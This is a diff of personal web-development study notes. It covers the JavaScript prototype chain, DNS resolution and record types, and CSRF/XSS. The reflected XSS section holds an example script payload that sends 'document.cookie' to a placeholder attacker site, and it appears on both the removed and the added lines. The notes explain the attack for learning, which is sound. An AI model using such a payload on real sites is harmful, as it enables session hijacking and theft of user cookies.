@@ -75,7 +75,7 @@ remove unused code before bundling. This can be an issue when using barrel files
 
 ## Prototype chain
 
-Every object in JavaScript has a built-in property, which is called its prototype (`__proto__`. The prototype is itself an object, so the prototype will have its own prototype, making what's called a prototype chain. The chain ends when we reach a prototype that has null for its own prototype. 
+The prototype chain is a mechanism that allows objects to inherit properties and methods from other objects. Every object in JavaScript has a built-in property, which is called its prototype (`__proto__`). The prototype is itself an object, so the prototype will have its own prototype, creating a chain called a prototype chain. The chain ends when we reach a prototype that has null for its own prototype. 
 
 ## postCSS:
 
@@ -108,7 +108,7 @@ is the process of getting your static HTML from server and turning it into dynam
 <https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>
 <https://www.cloudflare.com/learning/dns/dns-server-types/#recursive-resolver>
 
-- You type URL like example.com into the address bar and hit enter
+- You type URL like 'example.com' into the address bar and hit enter
 - Browser first checks its cache. If no answer, it will check in the cache of OS (which is the host file)
 - If it's not there, browser uses DNS to retrieve the domain's nameservers: <https://www.youtube.com/watch?v=72snZctFFtA>
   + *DNS resolver* (also known as a *DNS recursor*) receives the query first. The IP of DNS resolver is set in network settings of you computer, default is your ISP
@@ -134,15 +134,15 @@ dns2.registrar-servers.com
 
 However, the best recomandation is to use web hosting's nameserver or third-party nameservers like Cloudflare
 
-The important thing to remember is this:
+The important thing to remember is:
 
 If you change your domain's nameservers away from the default nameservers at your domain registrar, you'll control your domain's DNS records at **your nameserver provider**, **not** your domain registrar
 
 ### DNS record types
 
-- A Record: point a domain (or subdomain) to an IP address
-- CNAME Record (Canonical name record): points a domain to another domain. This is used when a site has subdomains, such as shop.myblog.com or donations.myblog.com. These are subdomains of myblog.com. Let’s say that each of these subdomains has a CNAME record containing the value “myblog.com.” Since the DNS is looking for an IP address, when the CNAME record is accessed, a further lookup is carried out at myblog.com (as this is the value contained in the CNAME file). It will then return the IP address stored in myblog.com’s A record. This means that these subdomains are aliases of the main domain, and the canonical name (or true name) of these subdomains is actually 'myblog.com'
-- MX Record: point email to a particular mail server. Like a CNAME, MX Entries must point to a domain and never point directly to an IP address.
+- `A` Record: points a domain (or subdomain) to an IP address
+- `CNAME` Record (Canonical name record): points a domain to another domain. This is used when a site has subdomains, such as shop.myblog.com or donations.myblog.com. These are subdomains of myblog.com. Let’s say that each of these subdomains has a CNAME record containing the value “myblog.com.” Since the DNS is looking for an IP address, when the CNAME record is accessed, a further lookup is carried out at myblog.com (as this is the value contained in the CNAME file). It will then return the IP address stored in myblog.com’s A record. This means that these subdomains are aliases of the main domain, and the canonical name (or true name) of these subdomains is actually 'myblog.com'
+- `MX` Record: point email to a particular mail server. Like a CNAME, MX Entries must point to a domain and never point directly to an IP address.
 
 ## CSRF and XSS
 
@@ -161,7 +161,7 @@ Attacker attempts to inject JavaScript through form inputs, where the attacker p
 
 - Reflected XSS
 
-Attackers inject JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed and user will be redirect to attacker site which implement a log system that can extract the cookie data
+Attackers inject JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed first to read the cookie on user's website and then user is redirect to attacker site which implement a log system that can extract the cookie data
 
 As you can see XSS exploit storage (session or local) and cookie that `httpOnly` set to `false`
 
